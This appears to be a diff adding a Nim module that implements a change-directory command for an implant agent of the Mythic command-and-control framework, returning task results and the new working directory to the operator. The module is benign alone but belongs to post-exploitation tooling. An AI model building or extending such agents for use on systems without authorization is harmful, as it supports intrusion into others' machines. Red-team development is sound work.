@@ -1,0 +1,49 @@
+import ../config
+import ../utils/mythic_responses
+import std/[json, os, strformat]
+
+type
+  CdArgs = object
+    path: string
+
+proc changeDirectory*(taskId: string, params: string): JsonNode =
+  let cfg = getConfig()
+  
+  # Parse arguments
+  let args = parseJson(params).to(CdArgs)
+  
+  if cfg.debug:
+    echo "[DEBUG] Changing directory to: ", args.path
+  
+  try:
+    # Handle the path
+    let targetPath = if isAbsolute(args.path):
+      args.path
+    else:
+      getCurrentDir() / args.path
+    
+    # Check if directory exists
+    if not dirExists(targetPath):
+      return mythicError(taskId, &"Directory does not exist: {targetPath}")
+    
+    # Change directory
+    setCurrentDir(targetPath)
+    
+    # Get the new current directory
+    let newCwd = getCurrentDir()
+    
+    if cfg.debug:
+      echo "[DEBUG] Changed directory to: ", newCwd
+    
+    # Create response with cwd callback
+    var response = mythicSuccess(taskId, &"Changed directory to '{newCwd}'")
+    response["callback"] = %* {
+      "cwd": newCwd
+    }
+    
+    return response
+    
+  except OSError as e:
+    return mythicError(taskId, &"Failed to change directory: {e.msg}")
+  except Exception as e:
+    return mythicError(taskId, &"Error: {e.msg}")
